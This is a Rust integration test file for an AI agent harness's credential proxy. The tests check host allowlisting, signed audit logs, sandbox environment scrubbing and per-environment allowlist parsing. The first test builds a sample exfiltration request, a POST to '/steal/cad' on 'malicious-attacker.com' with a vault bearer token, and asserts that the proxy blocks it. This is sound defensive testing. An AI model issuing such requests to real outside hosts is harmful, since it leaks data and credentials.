//! Integration tests for S3A credential proxy and host allowlist (§005).
//!
//! Validates:
//! 1. Blocked host refused and recorded in audit log.
//! 2. Sandbox environment is scrubbed and contains zero ambient secrets.
//! 3. Signed audit log entry written with cryptographic verification and zero secrets.
//! 4. Per-environment allowlist parsing in agent TOML.

use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};

use s3a_harness::config::AgentConfig;
use s3a_harness::proxy::{
    AuthType, CredentialProxy, EgressRequest, HostAllowlist, MemorySecretStore, NamedConnection,
    ProxyDecision, ProxyError,
};
use s3a_sandbox::records::JobRecord;
use s3a_sandbox::runner::execute_job_in_sandbox_with_proxy;
use serde_json::json;

#[test]
fn test_blocked_host_refused() {
    let allowlist = HostAllowlist::new(vec![
        "api.internal.corp".to_string(),
        "*.plm.corp".to_string(),
    ]);

    let secret_store = Arc::new(MemorySecretStore::new());
    secret_store.insert("vault:evil_key", "super-secret-evil-token");

    let proxy = Arc::new(CredentialProxy::new("agent-007", allowlist, secret_store));

    // Register a connection pointing to an unallowed / blocked external domain
    proxy.register_connection(NamedConnection::new(
        "exfil_connection",
        "malicious-attacker.com",
        AuthType::Bearer,
        "vault:evil_key",
    ));

    let req = EgressRequest {
        connection: "exfil_connection".to_string(),
        path: "/steal/cad".to_string(),
        method: "POST".to_string(),
        headers: Default::default(),
        body: Some(json!({"exfil": "data"}).to_string()),
    };

    // 1. Direct handle_request verification
    let res = proxy.handle_request(&req);
    assert!(
        matches!(res, Err(ProxyError::HostBlocked(ref h)) if h == "malicious-attacker.com"),
        "Expected HostBlocked error, got {:?}",
        res
    );

    // 2. Audit record verification
    let records = proxy.audit_records();
    assert_eq!(records.len(), 1);
    let record = &records[0];
    assert_eq!(record.agent_id, "agent-007");
    assert_eq!(record.connection, "exfil_connection");
    assert_eq!(record.host, "malicious-attacker.com");
    assert_eq!(
        record.decision,
        ProxyDecision::HostBlocked {
            host: "malicious-attacker.com".to_string()
        }
    );
    assert!(record.verify(), "Audit record signature must be valid");

    // 3. HTTP Loopback server test: blocked host returns HTTP 403 Forbidden
    let server_handle = Arc::clone(&proxy).start_loopback_server().unwrap();
    let client_req = json!({
        "connection": "exfil_connection",
        "path": "/steal/cad",
        "method": "POST",
    });

    let resp = ureq::post(&format!("{}/egress", server_handle.url()))
        .set("Content-Type", "application/json")
        .send_string(&client_req.to_string());

    match resp {
        Err(ureq::Error::Status(code, r)) => {
            assert_eq!(code, 403);
            let body = r.into_string().unwrap();
            assert!(body.contains("HostBlocked"));
        }
        other => panic!("Expected HTTP 403 Forbidden, got {:?}", other),
    }

    server_handle.shutdown();
}

#[test]
fn test_sandbox_env_contains_no_secrets() {
    // Set ambient secret environment variables in the host/parent process
    std::env::set_var(
        "S3A_VAULT_MASTER_KEY",
        "ultra-classified-vault-master-key-999",
    );
    std::env::set_var("PLM_SECRET_TOKEN", "secret-bearer-plm-token-888");
    std::env::set_var("OPENAI_API_KEY", "sk-secret-token-do-not-leak");

    let allowlist = HostAllowlist::new(vec!["*.plm.corp".to_string(), "127.0.0.1".to_string()]);
    let secret_store = Arc::new(MemorySecretStore::new());
    secret_store.insert("vault:plm_token", "secret-bearer-plm-token-888");

    let proxy = Arc::new(CredentialProxy::new(
        "agent-sandboxed",
        allowlist,
        secret_store,
    ));
    proxy.register_connection(NamedConnection::new(
        "plm_viewer",
        "cad.plm.corp",
        AuthType::Bearer,
        "vault:plm_token",
    ));

    let server_handle = Arc::clone(&proxy).start_loopback_server().unwrap();

    // Ensure s3a-sandbox binary is built if running in isolated test environment
    if !s3a_sandbox::runner::find_sandbox_binary().exists() {
        let _ = std::process::Command::new("cargo")
            .args(["build", "-p", "s3a-sandbox", "--bin", "s3a-sandbox"])
            .status();
    }

    let job = JobRecord {
        id: [0x55; 16],
        kind: "sandbox_proxy_egress".to_string(),
        inputs: json!({
            "connection": "plm_viewer",
            "path": "/api/v1/cad/model_42",
            "method": "GET",
        }),
        requested_by: [0x01; 16],
        grant: [0x02; 16],
        signature: [0; 64],
        created_at: SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs(),
    };

    // Execute job inside isolated subprocess with scrubbed environment and proxy routing
    let result = execute_job_in_sandbox_with_proxy(&job, Some(&server_handle.url()));
    assert!(
        result.is_ok(),
        "Sandbox execution failed: {:?}",
        result.err()
    );

    let output = result.unwrap();
    assert_eq!(output["success"], true);
    assert_eq!(output["status"], 200);

    // Verify sandbox examined its environment and detected zero secret variables
    let inspected_vars = output["inspected_env"].as_array().expect("env array");
    for var in inspected_vars {
        let name = var.as_str().unwrap().to_uppercase();
        assert!(
            !name.contains("VAULT"),
            "Leaked variable in sandbox: {}",
            name
        );
        assert!(
            !name.contains("SECRET"),
            "Leaked variable in sandbox: {}",
            name
        );
        assert!(
            !name.contains("OPENAI"),
            "Leaked variable in sandbox: {}",
            name
        );
    }

    server_handle.shutdown();
}

#[test]
fn test_log_entry_written_and_never_contains_secret() {
    let allowlist = HostAllowlist::new(vec!["cad.plm.corp".to_string()]);
    let secret_store = Arc::new(MemorySecretStore::new());
    let raw_secret = "confidential-plm-secret-xyz123";
    secret_store.insert("vault:plm_cad_token", raw_secret);

    let proxy = CredentialProxy::new("agent-auditor", allowlist, secret_store);
    proxy.register_connection(NamedConnection::new(
        "cad_service",
        "cad.plm.corp",
        AuthType::Bearer,
        "vault:plm_cad_token",
    ));

    let req = EgressRequest {
        connection: "cad_service".to_string(),
        path: "/api/parts".to_string(),
        method: "GET".to_string(),
        headers: Default::default(),
        body: None,
    };

    let resp = proxy.handle_request(&req).expect("Egress request");
    assert_eq!(resp.status, 200);

    // Audit record verification
    let records = proxy.audit_records();
    assert_eq!(records.len(), 1);
    let record = &records[0];

    assert_eq!(record.agent_id, "agent-auditor");
    assert_eq!(record.connection, "cad_service");
    assert_eq!(record.host, "cad.plm.corp");
    assert_eq!(record.method, "GET");
    assert_eq!(record.decision, ProxyDecision::Allowed);
    assert!(record.verify(), "Ed25519 signature must verify");

    // CRITICAL SECURITY INVARIANT: The secret must NEVER be serialized or logged
    let serialized_record = serde_json::to_string(&record).unwrap();
    assert!(
        !serialized_record.contains(raw_secret),
        "Secret leaked into audit record!"
    );
    assert!(
        !serialized_record.contains("xyz123"),
        "Secret substring leaked into audit record!"
    );
}

#[test]
fn test_agent_config_toml_per_environment_allowlist() {
    let toml_content = r#"
[agent]
id = "scholar_net_agent"
name = "Scholar Network Agent"
model = "llama3.2:3b"

[limits]
max_turns = 10
max_tool_calls = 20
timeout_secs = 60
token_budget = 16000

[network]
environment = "development"
allowed_hosts = ["fallback.corp.internal"]

[network.development]
allowed_hosts = ["dev.plm.corp", "*.internal.dev", "localhost"]

[network.production]
allowed_hosts = ["prod.plm.corp", "*.corp.net"]
"#;

    let cfg = AgentConfig::parse_toml(toml_content).expect("Parse agent TOML");
    assert_eq!(
        cfg.network.default_environment,
        Some("development".to_string())
    );

    // Active environment ("development")
    let dev_hosts = cfg.network.allowed_hosts_for_env(Some("development"));
    assert_eq!(
        dev_hosts,
        vec!["dev.plm.corp", "*.internal.dev", "localhost"]
    );

    // Production environment
    let prod_hosts = cfg.network.allowed_hosts_for_env(Some("production"));
    assert_eq!(prod_hosts, vec!["prod.plm.corp", "*.corp.net"]);

    // Default environment fallback
    let default_hosts = cfg.network.allowed_hosts_for_env(None);
    assert_eq!(
        default_hosts,
        vec!["dev.plm.corp", "*.internal.dev", "localhost"]
    );

    // Unknown environment fallback
    let fallback_hosts = cfg.network.allowed_hosts_for_env(Some("staging"));
    assert_eq!(fallback_hosts, vec!["fallback.corp.internal"]);

    // Check with HostAllowlist
    let allowlist = HostAllowlist::new(dev_hosts);
    assert!(allowlist.is_allowed("dev.plm.corp"));
    assert!(allowlist.is_allowed("service.internal.dev"));
    assert!(allowlist.is_allowed("localhost:3000"));
    assert!(!allowlist.is_allowed("prod.plm.corp"));
    assert!(!allowlist.is_allowed("evil.com"));
}
